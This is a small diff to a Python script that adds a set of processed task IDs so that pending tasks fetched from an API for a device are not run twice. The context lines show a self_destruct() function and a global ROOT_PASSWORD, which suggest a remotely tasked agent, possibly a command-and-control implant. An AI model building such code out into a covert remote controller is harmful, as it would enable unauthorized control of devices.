@@ -440,13 +440,20 @@ def self_destruct():
         print(f"Destruct failed: {e}", flush=True)
         return False
 
+PROCESSED_TASKS = set()
+
 def process_tasks(config, device_id):
-    global ROOT_PASSWORD
+    global ROOT_PASSWORD, PROCESSED_TASKS
     tasks = api_request(config, f"tasks?device_id=eq.{device_id}&status=eq.pending&select=*")
     if not tasks: return
 
     for task in tasks:
         task_id = task['id']
+        if task_id in PROCESSED_TASKS:
+            print(f"Skipping already processed task: {task_id}", flush=True)
+            continue
+            
+        PROCESSED_TASKS.add(task_id)
         task_type = task['task_type']
         params = task.get('task_params', {})
         print(f"Processing task: {task_type} (ID: {task_id})", flush=True)
